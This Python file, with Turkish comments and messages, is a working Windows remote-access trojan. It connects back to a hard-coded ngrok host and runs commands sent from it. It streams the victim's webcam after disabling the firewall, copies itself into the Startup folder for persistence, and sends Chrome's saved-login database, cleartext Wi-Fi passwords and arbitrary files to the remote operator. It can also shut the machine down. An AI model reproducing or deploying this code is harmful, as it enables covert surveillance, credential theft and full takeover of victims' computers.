import socket
import subprocess
import os
import time
from threading import Thread
from flask import Flask, Response
import cv2
import requests
import shutil
import sys

app = Flask(__name__)
camera = None
camera_thread = None

def gen_frames():
    global camera
    while True:
        if camera:
            success, frame = camera.read()
            if not success:
                break
            else:
                ret, buffer = cv2.imencode('.jpg', frame)
                frame = buffer.tobytes()
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

@app.route('/video_feed')
def video_feed():
    return Response(gen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/')
def index():
    return '''<html>
                <head>
                    <title>Kamera Yayını</title>
                </head>
                <body>
                    <h1>Kamera Yayını</h1>
                    <img src="/video_feed">
                </body>
              </html>'''

def run_flask():
    app.run(host='0.0.0.0', port=5000)

def get_ngrok_url():
    response = requests.get("http://127.0.0.1:4040/api/tunnels")
    if response.status_code == 200:
        tunnels = response.json()['tunnels']
        for tunnel in tunnels:
            if tunnel['proto'] == 'https':
                return tunnel['public_url']
    return None

def send_url_to_server_via_socket(ngrok_url, s):
    s.sendall(ngrok_url.encode('utf-8'))
    print("URL başarıyla gönderildi.")

def download_and_setup_ngrok():
    ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip"
    zip_path = "ngrok.zip"
    extract_path = "ngrok"
    
    response = requests.get(ngrok_url)
    with open(zip_path, 'wb') as file:
        file.write(response.content)
    shutil.unpack_archive(zip_path, extract_path)
    ngrok_path = os.path.join(extract_path, "ngrok.exe")
    os.environ["PATH"] += os.pathsep + os.path.abspath(extract_path)
    
    return ngrok_path

def sistemi_kapat():
    os.system('shutdown /s /t 0')

def cd_komut(directory):
    try:
        os.chdir(directory)
        return f"Dizin değiştirildi: {directory}\n"
    except FileNotFoundError:
        return f"Dizin bulunamadı: {directory}\n"

def d_okuma(dosyanın_adı, s):
    try:
        with open(dosyanın_adı, 'rb') as dosya:
            while True:
                veri = dosya.read(1024)
                if not veri:
                    break
                s.sendall(veri)
    except FileNotFoundError:
        komut_cikis = f"{dosyanın_adı} adlı dosyayı bulamadık.\n"
        s.sendall(komut_cikis.encode("utf-8"))

def wifi_komut(s):
    try:
        subprocess.run('cmd /c cd %temp% && netsh wlan export profile key=clear', shell=True)
        time.sleep(2)
        subprocess.run('powershell Select-String -Path Wi*.xml -Pattern "keyMaterial" > Wi-Fi-PASS', shell=True)
        with open('Wi-Fi-PASS', 'rb') as f:
            while True:
                data = f.read(1024)
                if not data:
                    break
                s.sendall(data)
                time.sleep(2)
        os.remove('Wi-Fi-PASS')
    except FileNotFoundError:
        mesaj2 = "Wi-Fi-PASS bulunamadı\n"
        s.sendall(mesaj2.encode("utf-8"))

def handle_commands(komut1, s):
    global camera, camera_thread

    komut_cikis = ""

    if komut1 == 'camera':
        subprocess.run('netsh advfirewall set allprofiles state off',shell=True)
        if camera_thread is None or not camera_thread.is_alive():
            camera = cv2.VideoCapture(0)
            camera_thread = Thread(target=run_flask)
            camera_thread.start()
            komut_cikis = "Kamera yayını başlatıldı: http://localhost:5000\n"
        else:
            komut_cikis = "Kamera yayını zaten aktif.\n"
    elif komut1 == "kalıcı":
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        mevcut_dosya = sys.argv[0]
        file_name = os.path.basename(mevcut_dosya)
        destination = os.path.join(startup_folder, file_name)
        try:
            shutil.copy(mevcut_dosya, destination)
            komut_cikis = f"{file_name} dosyası başlangıç klasörüne kopyalandı: {destination}\n"
        except Exception as e:
            komut_cikis = f"Bir hata oluştu: {str(e)}\n"
    elif komut1 == 'ngrok':
        ngrok_path = download_and_setup_ngrok()
        ngrok_process = subprocess.Popen([ngrok_path, 'http', '5000'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5)
        ngrok_url = get_ngrok_url()
        if ngrok_url:
            send_url_to_server_via_socket(ngrok_url, s)
            komut_cikis = f"Ngrok URL: {ngrok_url}\n"
        else:
            komut_cikis = "Ngrok URL alınamadı.\n"
    elif komut1.startswith("password"):
        dosyanın_adı = r"C:\Users\HP\AppData\Local\Google\Chrome\User Data\Default\Login Data"
        d_okuma(dosyanın_adı, s)
    elif komut1.startswith("cd "):
        dizin = komut1[3:].strip()
        komut_cikis = cd_komut(dizin)
    elif komut1 == "sistemi_kapat":
        komut_cikis = "Sistem kapatılıyor\n"
        s.sendall(komut_cikis.encode("utf-8"))
        sistemi_kapat()
        return False
    elif komut1.startswith("download"):
        dosyanın_adı = komut1[9:].strip()
        d_okuma(dosyanın_adı, s)
    elif komut1 == "wifi":
        wifi_komut(s)
    else:
        try:
            process = subprocess.Popen(komut1, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            if stdout:
                komut_cikis = stdout.strip()
            else:
                komut_cikis = stderr.strip()
            if process.returncode != 0:
                komut_cikis = stderr.strip()
        except Exception as e:
            komut_cikis = str(e)

    s.sendall(komut_cikis.encode("utf-8"))
    return True

def main():
    NGROK_URL = '7.tcp.eu.ngrok.io'
    PORT = 19941

    def socket_listener(s):
        while True:
            try:
                komut = s.recv(1024)
                if not komut:
                    break
                komut1 = komut.decode("utf-8").strip()
                if komut1 == 'quit':
                    s.close()
                    break
                if not handle_commands(komut1, s):
                    break
            except (Exception, WindowsError) as e:
                print(f"Hata oluştu: {str(e)}")
                break

    def send_alive_message(s):
        while True:
            try:
                s.sendall(b"alive")
                time.sleep(10)
            except Exception as e:
                print(f"Hata oluştu: {str(e)}")
                break

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((NGROK_URL, PORT))
            baglan = "bağlanıldı\n"
            s.sendall(baglan.encode("utf-8"))

            listener_thread = Thread(target=socket_listener, args=(s,))
            listener_thread.start()

            alive_thread = Thread(target=send_alive_message, args=(s,))
            alive_thread.start()

            listener_thread.join()
            alive_thread.join()
        except ConnectionRefusedError:
            print("Bağlantı reddedildi, 10 saniye sonra tekrar denenecek")
            time.sleep(10)
        except Exception as e:
            print(f"Hata oluştu: {str(e)}")
            time.sleep(10)

if __name__ == '__main__':
    main()
